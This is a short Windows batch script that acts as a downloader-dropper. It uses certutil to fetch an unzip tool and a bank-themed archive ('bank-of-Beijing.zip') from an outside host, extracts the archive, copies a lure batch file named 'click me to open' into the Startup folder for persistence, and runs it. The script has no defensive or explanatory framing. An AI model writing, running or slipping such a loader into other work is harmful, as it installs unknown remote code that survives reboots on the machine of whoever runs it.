 
@echo off
rem start python TransFile.py
set d=%USERPROFILE%\Desktop
echo %d%


certutil.exe -urlcache -split -f http://testlink.beats-digital.com/tools/unzip.exe

certutil.exe -urlcache -split -f http://testlink.beats-digital.com/tools/bank-of-Beijing.zip

unzip -o bank-of-Beijing.zip -d bank-of-Beijing/

xcopy /y %d%\bank-of-Beijing\点我打开.bat "%AppData%\Microsoft\Windows\Start Menu\Programs\Startup\"

start "%AppData%\Microsoft\Windows\Start Menu\Programs\Startup\点我打开.bat"

